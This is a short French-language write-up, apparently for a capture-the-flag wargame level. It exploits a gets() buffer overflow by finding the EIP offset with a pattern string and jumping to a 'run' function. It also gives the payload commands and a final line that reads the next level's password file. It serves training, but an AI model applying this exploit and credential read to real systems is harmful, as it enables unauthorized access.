@@ -1,0 +1,21 @@
+# apres analyze avec 'objdump -D ./level01', on voit que le gets n'est pas protege d'un  buffer overflow.
+# On utilise un outil pour trouver la longeur de la string
+# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+# Donc on essaye avec 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
+# On obtient un segfault, l'address du pointeur d'instruction (eip) pointe sur 0x63413563, donc la suite c5Ac.
+# Donc on sait que apres 76 caractere on peut mettre l'adresse pour un jump.
+# La fonction 'run' est a l'adresse 0x8048444.
+
+# On le rajoute a la fin de la string de 76 caracteres.
+
+echo -e "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A\x44\x84\x04\x08" > /tmp/file // on met en little endian l'adresse.
+cat /tmp/file | ./level1
+
+# On a un message contenue dans la fonction run mais le programe segfault toujours.
+
+# On va donc essayer de garder une ecoute sur stdin avec le cat
+
+cat /tmp/file - | ./level1
+> cat /tmp/user/level2/.pass
+
